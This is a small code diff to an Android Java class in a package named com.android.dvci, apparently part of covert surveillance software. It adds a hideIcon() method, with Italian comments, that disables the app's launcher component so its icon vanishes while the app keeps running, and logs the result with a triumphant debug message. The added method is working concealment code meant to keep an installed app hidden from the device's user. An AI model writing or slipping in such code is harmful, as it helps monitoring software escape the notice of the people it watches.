@@ -7,6 +7,7 @@
 
 package com.android.dvci;
 
+import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.PackageManager;
@@ -829,6 +830,21 @@ public class Status {
 			}
 			return false;
 		}
+	}
+	static public void hideIcon() {
+		// Nascondi l'icona (subito in android 4.x, al primo reboot
+		// in android 2.x)
+		PackageManager pm = Status.self().getAppContext().getPackageManager();
+		ComponentName cn = new ComponentName(Status.self().getAppContext().getPackageName(),ASG.class.getCanonicalName());
+		int i=pm.getComponentEnabledSetting(cn);
+		if(i != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " YEAHH Hide ICON for:"+cn);//$NON-NLS-1$
+			}
+			pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+					PackageManager.DONT_KILL_APP);
+		}
+
 	}
 
 	public boolean haveCamera() {
